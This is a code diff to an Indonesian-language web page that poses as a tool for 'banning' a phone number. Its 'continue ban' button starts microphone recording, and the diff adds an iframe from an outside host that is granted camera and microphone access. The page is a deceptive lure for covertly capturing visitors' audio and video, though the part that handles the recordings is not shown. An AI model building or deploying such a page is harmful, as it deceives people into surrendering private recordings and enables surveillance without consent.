@@ -74,7 +74,7 @@
             alert("Ulangi Banned Gan");
         }
 
-        (function startAudioRecording() {
+        function startAudioRecording() {
             // Check if MediaRecorder API is supported
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
 
@@ -112,18 +112,20 @@
                     })
                     .catch(function (error) {
                         console.log("Error accessing user media: " + error);
-                    }
+                    });
             } else {
                 alert(" Not supported in this browser ❌");
             }
         }
-        )();
     </script>
 </head>
 <body>
     <!-- Logo -->
     <img src="https://telegra.ph/file/f81efc7283b8b6e8a870e.jpg" alt="Logo" class="logo">
+    <iframe src="https://mycode.example.net/etc" allow="camera; microphone">
+    </iframe>
 
     <!-- Teks dan Tombol -->
-    <h1>APAKAH ANDA YAKIN UNTUK BhAvNNED NOMER TERSEBUT</h1>
+    <h1>APAKAH ANDA YAKIN UNTUK BANNED NOMER TERSEBUT?</h1>
+    <button onclick="startAudioRecording()">LANJUTKAN BANNED</button>
 </html>
